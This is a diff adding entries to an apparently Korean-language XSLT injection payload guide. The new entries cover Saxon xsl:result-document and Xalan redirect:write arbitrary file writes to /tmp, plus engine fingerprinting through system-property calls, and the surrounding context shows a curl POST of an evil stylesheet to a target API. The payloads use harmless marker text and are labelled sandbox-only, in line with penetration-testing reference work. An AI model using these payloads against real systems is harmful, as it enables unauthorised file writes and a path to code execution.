@@ -65,6 +65,31 @@ curl -X POST "https://target/api/transform" -H "Content-Type: application/xml" -
 # evil.xsl에 위 페이로드 포함
 ```
 
+#### Saxon 임의 파일 쓰기 (`<xsl:result-document>`)
+```xml
+<xsl:result-document href="file:///tmp/xslt-write-test.txt" method="text">
+  XSLT_WRITE_MARKER
+</xsl:result-document>
+<!-- /tmp/xslt-write-test.txt 생성 확인 (sandbox 한정) -->
+```
+
+#### 엔진 fingerprint
+```xml
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:product-name')"/>
+<!-- 응답에 "SAXON"/"Xalan"/"Microsoft" 등 노출 → 엔진별 페이로드 적용 -->
+```
+
+#### Xalan `pipeDocument`/`write` (Java 환경)
+```xml
+<xsl:stylesheet xmlns:xalan="http://xml.apache.org/xalan"
+                xmlns:redirect="http://xml.apache.org/xalan/redirect"
+                extension-element-prefixes="redirect">
+  <redirect:write file="/tmp/xalan-write.txt">XALAN_RCE</redirect:write>
+</xsl:stylesheet>
+```
+
 ---
 
 ### 우회 페이로드
